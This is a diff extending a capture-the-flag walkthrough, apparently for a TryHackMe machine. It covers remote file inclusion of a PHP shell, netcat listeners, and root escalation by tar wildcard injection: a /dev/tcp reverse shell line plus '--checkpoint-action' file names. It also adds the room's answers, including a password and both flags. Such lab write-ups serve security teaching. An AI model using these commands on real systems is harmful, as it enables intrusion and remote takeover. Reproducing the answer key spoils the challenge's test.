@@ -130,11 +130,28 @@ Let's try downloading the configuration file: `http://10.10.190.140/45kra24zxs28
 And we got another set of credentials. These might be usefull later. Now let's try to include a malicious file from our own machine, let's call it shell.php (the code is provided in the file "shell.php" of this folder). Open a netcat listener `nc -lnvp 4444`, set up a web server with `python3 -m http.server 8000`, and upload it to the target machine with the following URL: `http://10.10.190.140/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://10.11.85.53:8000/shell.php`. There we go: <br />
 ![image](https://github.com/user-attachments/assets/f97120a9-1b82-4629-a34e-9a4818959216)<br />
 ![image](https://github.com/user-attachments/assets/a363b8d5-dd59-46cc-9082-160316c68c6b)<br />
-And we have our user flag (the answers are all at the end of the writeup)
+And we have our user flag (the answers are all at the end of the writeup). Now let's stabilize the shell: 
+
+            python3 -c 'import pty;pty.spawn("/bin/bash")'
+            CTRL + Z
+            stty raw -echo; fg
+            export TERM=xterm
+After some enumeration(I used linpeas), I found an interesting cron job: <br />
+![image](https://github.com/user-attachments/assets/7eda4bd9-006b-45c3-8502-599cbae34fee)<br />
+It runs every minute and it is owned by root. We also have read access to that file: <br />
+![image](https://github.com/user-attachments/assets/acc04231-636e-448c-ab41-108fa5abd949)<br />
+The command `tar cf /home/milesdyson/backups/backup.tgz *` will run a backup of all the files in the current directory. Since we are www-data, we have access to that directory. We can exploit this by using tar wildcards; move to `/var/www/html` and run the following commands: 
+
+      echo "bash -i >& /dev/tcp/YOUR_IP/YOUR_PORT 0>&1" > shell.sh
+      touch -- '--checkpoint=1'
+      touch -- '--checkpoint-action=exec=bash shell.sh'
+A "checkpoint" is essentially a tar option that tells tar to stop and do something. In particular we are telling tar to execute the reverse shell script. So open a netcat listener `nc -lnvp 4445` and wait a minute: <br />
+![image](https://github.com/user-attachments/assets/cb10878b-3537-45c6-8a9c-dbb805c23b2d)<br />
+We are root :)
 
                                                             
-- What is Miles password for his emails?
-- What is the hidden directory?
-- What is the vulnerability called when you can include a remote file for malicious purposes?
-- What is the user flag?
-- What is the root flag?
+- What is Miles password for his emails? `cyborg007haloterminator`
+- What is the hidden directory? `/45kra24zxs28v3yd`
+- What is the vulnerability called when you can include a remote file for malicious purposes? `remote file inclusion `
+- What is the user flag? `7ce5c2109a40f958099283600a9ae807`
+- What is the root flag? `3f0372db24753accc7179a282cd6a949`
